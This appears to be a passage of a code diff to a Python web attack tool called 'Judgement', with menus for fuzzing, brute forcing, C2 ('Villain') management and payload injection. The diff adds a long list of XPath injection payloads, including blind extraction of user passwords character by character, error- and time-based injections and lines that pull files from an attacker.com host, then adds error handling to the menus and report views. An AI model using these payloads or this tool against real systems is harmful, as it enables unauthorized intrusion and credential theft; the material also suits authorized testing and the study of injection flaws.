-                "' or contains(name(/*[1]),'F') or '",
-                "' or contains(name(/*[1]),'G') or '",
-                "' or contains(name(/*[1]),'H') or '",
-                "' or contains(name(/*[1]),'I') or '",
-                "' or contains(name(/*[1]),'J') or '",
-                "' or contains(name(/*[1]),'K') or '",
-                "' or contains(name(/*[1]),'L') or '",
-                "' or contains(name(/*[1]),'M') or '",
-                "' or contains(name(/*[1]),'N') or '",
-                "' or contains(name(/*[1]),'O') or '",
-                "' or contains(name(/*[1]),'P') or '",
-                "' or contains(name(/*[1]),'Q') or '",
-                "' or contains(name(/*[1]),'R') or '",
-                "' or contains(name(/*[1]),'S') or '",
-                "' or contains(name(/*[1]),'T') or '",
-                "' or contains(name(/*[1]),'U') or '",
-                "' or contains(name(/*[1]),'V') or '",
-                "' or contains(name(/*[1]),'W') or '",
-                "' or contains(name(/*[1]),'X') or '",
-                "' or contains(name(/*[1]),'Y') or '",
-                "' or contains(name(/*[1]),'Z') or '",
-                "' or contains(name(/*[1]),'a') or '",
-                "' or contains(name(/*[1]),'b') or '",
-                "' or contains(name(/*[1]),'c') or '",
-                "' or contains(name(/*[1]),'d') or '",
-                "' or contains(name(/*[1]),'e') or '",
-                "' or contains(name(/*[1]),'f') or '",
-                "' or contains(name(/*[1]),'g') or '",
-                "' or contains(name(/*[1]),'h') or '",
-                "' or contains(name(/*[1]),'i') or '",
-                "' or contains(name(/*[1]),'j') or '",
-                "' or contains(name(/*[1]),'k') or '",
-                "' or contains(name(/*[1]),'l') or '",
-                "' or contains(name(/*[1]),'m') or '",
-                "' or contains(name(/*[1]),'n') or '",
-                "' or contains(name(/*[1]),'o') or '",
-                "' or contains(name(/*[1]),'p') or '",
-                "' or contains(name(/*[1]),'q') or '",
-                "' or contains(name(/*[1]),'r') or '",
-                "' or contains(name(/*[1]),'s') or '",
-                "' or contains(name(/*[1]),'t') or '",
-                "' or contains(name(/*[1]),'u') or '",
-                "' or contains(name(/*[1]),'v') or '",
-                "' or contains(name(/*[1]),'w') or '",
-                "' or contains(name(/*[1]),'x') or '",
-                "' or contains(name(/*[1]),'y') or '",
-                "' or contains(name(/*[1]),'z') or '"
+                "' or starts-with(name(/*[1]),'root') or '",
+                "' or contains(name(/*[1]),'user') or '",
+                "' or substring(name(/*[1]),1,1)='u' or '",
+                "' or normalize-space(name(/*[1]))='user' or '",
+                # Advanced enumeration
+                "' or name(/*[1])='users' or '",
+                "' or name(/*[2])='users' or '",
+                "' or name(//*[1])='users' or '",
+                "' or local-name(/*[1])='users' or '",
+                "' or namespace-uri(/*[1])!='' or '",
+                # Data extraction patterns
+                "' or string-length(//user[1]/password)>0 or '",
+                "' or substring(//user[1]/password,1,1)='a' or '",
+                "' or substring(//user[1]/password,1,1)='b' or '",
+                "' or substring(//user[1]/password,1,1)='c' or '",
+                "' or substring(//user[1]/password,1,1)='d' or '",
+                "' or substring(//user[1]/password,1,1)='e' or '",
+                "' or substring(//user[1]/password,1,1)='f' or '",
+                "' or substring(//user[1]/password,1,1)='0' or '",
+                "' or substring(//user[1]/password,1,1)='1' or '",
+                "' or substring(//user[1]/password,1,1)='2' or '",
+                "' or substring(//user[1]/password,1,1)='3' or '",
+                # Union-style injections
+                "']*|[username='admin' and password='*",
+                "']*|[*",
+                "' or 1=1]*|[*",
+                # Error-based injections
+                "' and extractvalue(1,concat(0x7e,version(),0x7e)) or '",
+                "' and 1=updatexml(1,concat(0x7e,version(),0x7e),1) or '",
+                # Time-based blind injections
+                "' or count(/)=waitfor delay '00:00:05' or '",
+                "' or benchmark(5000000,md5(1)) or '",
+                # Function-based attacks
+                "' or doc('http://attacker.com/file.xml') or '",
+                "' or unparsed-text('http://attacker.com/file.txt') or '",
+                # Encoding bypass attempts
+                "&#39; or &#39;1&#39;=&#39;1",
+                "%27 or %271%27=%271",
+                "\\' or \\'1\\'=\\'1",
+                # Advanced boolean injections
+                "admin' or '1'='1' or ''='",
+                "admin') or ('1'='1' and '1'='1",
+                "') or (1=1) and ('1'='1",
+                "' or true() or '",
+                "' or false() or '",
+                # Attribute-based injections
+                "' or @*[contains(.,'admin')] or '",
+                "' or @username='admin' or '",
+                "' or @id=1 or '",
+                # Document structure discovery
+                "' or count(/*) or '",
+                "' or count(//*) or '",
+                "' or count(//@*) or '",
+                # Comprehensive node testing
+                "' or self::* or '",
+                "' or parent::* or '",
+                "' or child::* or '",
+                "' or descendant::* or '",
+                "' or ancestor::* or '",
+                "' or following::* or '",
+                "' or preceding::* or '",
+                # Content-based discovery
+                "' or text()='admin' or '",
+                "' or contains(text(),'admin') or '",
+                "' or starts-with(text(),'admin') or '",
+                "' or ends-with(text(),'admin') or '",
             ],
             "crlf_injection": [
                 "%0d%0aheader:header",
@@ -3872,46 +4031,62 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
         
     def run(self):
         """Main execution loop"""
-        self.show_banner()
-        
-        if not Confirm.ask("Do you have proper authorization for all targets?", default=False):
-            self.console.print("[bold red]Access denied. Authorization required.[/bold red]")
+        try:
+            self.show_banner()
+            
+            if not Confirm.ask("Do you have proper authorization for all targets?", default=False):
+                self.console.print("[bold red]Access denied. Authorization required.[/bold red]")
+                sys.exit(1)
+                
+            # Initialize SecLists
+            self.seclists_manager.download_seclists()
+            
+            while True:
+                try:
+                    self.main_menu()
+                    choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"])
+                    
+                    if choice == "1":
+                        self.target_discovery()
+                    elif choice == "2":
+                        self.parameter_discovery()
+                    elif choice == "3":
+                        self.directory_fuzzing()
+                    elif choice == "4":
+                        self.parameter_fuzzing()
+                    elif choice == "5":
+                        self.brute_force_testing()
+                    elif choice == "6":
+                        self.full_assessment()
+                    elif choice == "7":
+                        self.target_file_management()
+                    elif choice == "8":
+                        self.view_reports()
+                    elif choice == "9":
+                        self.view_vuln_fields()
+                    elif choice == "10":
+                        self.villain_management()
+                    elif choice == "11":
+                        self.standalone_payload_injection()
+                    elif choice == "12":
+                        self.configuration()
+                    elif choice == "13":
+                        self.console.print("[bold green]Exiting Judgement. Happy hunting![/bold green]")
+                        break
+                except KeyboardInterrupt:
+                    self.console.print("\n[yellow]Interrupted. Returning to main menu...[/yellow]")
+                    continue
+                except Exception as e:
+                    self.logger.log(f"Error in main menu: {e}", "ERROR")
+                    self.console.print(f"[red]An error occurred: {e}[/red]")
+                    self.console.print("[yellow]Returning to main menu...[/yellow]")
+                    continue
+        except KeyboardInterrupt:
+            self.console.print("\n[bold green]Exiting Judgement. Happy hunting![/bold green]")
+        except Exception as e:
+            self.logger.log(f"Critical error in main application: {e}", "ERROR")
+            self.console.print(f"[red]Critical error: {e}[/red]")
             sys.exit(1)
-            
-        # Initialize SecLists
-        self.seclists_manager.download_seclists()
-        
-        while True:
-            self.main_menu()
-            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"])
-            
-            if choice == "1":
-                self.target_discovery()
-            elif choice == "2":
-                self.parameter_discovery()
-            elif choice == "3":
-                self.directory_fuzzing()
-            elif choice == "4":
-                self.parameter_fuzzing()
-            elif choice == "5":
-                self.brute_force_testing()
-            elif choice == "6":
-                self.full_assessment()
-            elif choice == "7":
-                self.target_file_management()
-            elif choice == "8":
-                self.view_reports()
-            elif choice == "9":
-                self.view_vuln_fields()
-            elif choice == "10":
-                self.villain_management()
-            elif choice == "11":
-                self.standalone_payload_injection()
-            elif choice == "12":
-                self.configuration()
-            elif choice == "13":
-                self.console.print("[bold green]Exiting Judgement. Happy hunting![/bold green]")
-                break
                 
     def standalone_payload_injection(self):
         """Standalone payload injection without full C2 integration"""
@@ -4472,27 +4647,48 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
     def view_reports(self):
         """View and manage reports"""
         while True:
-            self.reports_menu()
-            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4"])
-            
-            if choice == "1":
-                # Show recent scans
-                self.console.print("[bold blue]Recent Scans[/bold blue]")
-                # In a real implementation, this would query the database
-                self.console.print("Recent scan data would be displayed here")
-            elif choice == "2":
-                # Generate HTML report
-                scan_id = Prompt.ask("Enter scan ID")
-                target = Prompt.ask("Enter target URL")
-                html_report = self.reporter.generate_html_report(scan_id, target)
-                self.console.print(f"[green]HTML Report saved to: {html_report}[/green]")
-            elif choice == "3":
-                # Export findings
-                scan_id = Prompt.ask("Enter scan ID (or 'all' for all findings)")
-                # In a real implementation, this would export findings to CSV/JSON
-                self.console.print("[green]Findings exported successfully[/green]")
-            elif choice == "4":
+            try:
+                self.reports_menu()
+                choice = Prompt.ask("Select option", choices=["1", "2", "3", "4"])
+                
+                if choice == "1":
+                    # Show recent scans
+                    self.console.print("[bold blue]Recent Scans[/bold blue]")
+                    # In a real implementation, this would query the database
+                    self.console.print("Recent scan data would be displayed here")
+                elif choice == "2":
+                    # Generate HTML report
+                    try:
+                        scan_id = Prompt.ask("Enter scan ID")
+                        target = Prompt.ask("Enter target URL")
+                        html_report = self.reporter.generate_html_report(scan_id, target)
+                        self.console.print(f"[green]HTML Report saved to: {html_report}[/green]")
+                    except KeyboardInterrupt:
+                        self.console.print("\n[yellow]Report generation cancelled[/yellow]")
+                        continue
+                    except Exception as e:
+                        self.logger.log(f"Error generating HTML report: {e}", "ERROR")
+                        self.console.print(f"[red]Error generating report: {e}[/red]")
+                elif choice == "3":
+                    # Export findings
+                    try:
+                        scan_id = Prompt.ask("Enter scan ID (or 'all' for all findings)")
+                        # In a real implementation, this would export findings to CSV/JSON
+                        self.console.print("[green]Findings exported successfully[/green]")
+                    except KeyboardInterrupt:
+                        self.console.print("\n[yellow]Export cancelled[/yellow]")
+                        continue
+                    except Exception as e:
+                        self.logger.log(f"Error exporting findings: {e}", "ERROR")
+                        self.console.print(f"[red]Error exporting findings: {e}[/red]")
+                elif choice == "4":
+                    break
+            except KeyboardInterrupt:
+                self.console.print("\n[yellow]Returning to main menu[/yellow]")
                 break
+            except Exception as e:
+                self.logger.log(f"Error in reports menu: {e}", "ERROR")
+                self.console.print(f"[red]An error occurred: {e}[/red]")
                 
     def view_vuln_fields(self):
         """View vulnerable fields"""
@@ -4506,7 +4702,14 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
             try:
                 with open(VULN_FIELDS_FILE, 'r') as f:
                     file_vuln_fields = json.load(f)
-            except:
+                    # Validate JSON data structure
+                    validated_fields = []
+                    for field in file_vuln_fields:
+                        if isinstance(field, dict) and "url" in field:
+                            validated_fields.append(field)
+                    file_vuln_fields = validated_fields
+            except Exception as e:
+                self.logger.log(f"Error loading vulnerable fields JSON: {e}", "ERROR")
                 file_vuln_fields = []
         else:
             file_vuln_fields = []
@@ -4522,26 +4725,37 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
             table.add_column("Confidence", style="yellow")
             table.add_column("Timestamp", style="blue")
             
-            # If from database
-            if isinstance(all_vuln_fields[0], tuple):
-                for field in all_vuln_fields:
-                    table.add_row(
-                        field[2],  # URL
-                        field[3],  # Parameter
-                        field[4],  # Vulnerability type
-                        str(field[7]),  # Confidence
-                        field[8]   # Timestamp
-                    )
-            # If from JSON file
-            else:
-                for field in all_vuln_fields:
-                    table.add_row(
-                        field.get("url", "N/A"),
-                        field.get("parameter_name", "N/A"),
-                        field.get("vulnerability_type", "N/A"),
-                        str(field.get("confidence", "N/A")),
-                        field.get("timestamp", "N/A")
-                    )
+            # Process each field individually based on its type
+            for field in all_vuln_fields:
+                try:
+                    if isinstance(field, tuple):
+                        # Database record (tuple format)
+                        if len(field) >= 9:  # Ensure tuple has enough elements
+                            table.add_row(
+                                str(field[2]) if field[2] else "N/A",  # URL
+                                str(field[3]) if field[3] else "N/A",  # Parameter
+                                str(field[4]) if field[4] else "N/A",  # Vulnerability type
+                                str(field[7]) if field[7] else "N/A",  # Confidence
+                                str(field[8]) if field[8] else "N/A"   # Timestamp
+                            )
+                        else:
+                            # Malformed tuple - skip with warning
+                            self.logger.log(f"Skipping malformed database record: {field}", "WARNING")
+                    elif isinstance(field, dict):
+                        # JSON record (dictionary format)
+                        table.add_row(
+                            field.get("url", "N/A"),
+                            field.get("parameter_name", "N/A"),
+                            field.get("vulnerability_type", "N/A"),
+                            str(field.get("confidence", "N/A")),
+                            field.get("timestamp", "N/A")
+                        )
+                    else:
+                        # Unknown format - skip with warning
+                        self.logger.log(f"Skipping unknown field format: {type(field)}", "WARNING")
+                except Exception as e:
+                    self.logger.log(f"Error processing vulnerable field: {e}", "ERROR")
+                    continue
                     
             self.console.print(table)
         else:
